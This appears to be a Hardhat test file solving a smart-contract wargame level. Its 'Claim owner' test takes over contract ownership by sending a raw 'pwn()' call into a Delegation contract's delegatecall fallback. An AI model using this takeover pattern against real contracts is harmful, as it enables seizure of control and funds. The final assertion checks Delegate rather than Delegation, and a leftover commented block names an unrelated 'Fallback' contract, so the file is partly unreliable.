const { expect } = require("chai");
const { ethers } = require("hardhat");

const store = {}

describe("Delegation", function () {
  it("deployment", async function () {
    const [owner, user] = await ethers.getSigners();

    const _Delegate = await ethers.getContractFactory("Delegate");
    store.Delegate = await _Delegate.deploy(owner);

    const _Delegation = await ethers.getContractFactory("Delegation");
    store.Delegation = await _Delegation.connect(owner).deploy(store.Delegate.target);
    store.owner = owner
    store.user = user
  });

  it("Check owner", async function () {
    const { Delegate, Delegation, owner } = store
    expect(await Delegate.owner()).to.eq(owner.address)
    expect(await Delegation.owner()).to.eq(owner.address)
  });
  it("Claim owner", async function () {
    const iface = new ethers.Interface(["function pwn()"]);
    const data = iface.encodeFunctionData("pwn");
    const { Delegate, Delegation, user, owner } = store
    await user.sendTransaction({
      to: Delegation.target,
      data: data
    })
    console.log("user: ", user.address);
    expect(await Delegate.owner()).to.eq(user.address)
  });
  /*
  it("Withdraw balance", async function () {
    const { Fallback, user } = store
    await Fallback.connect(user).withdraw()
    expect(await user.provider.getBalance(Fallback.target)).to.eq(0)
  });
  */
});
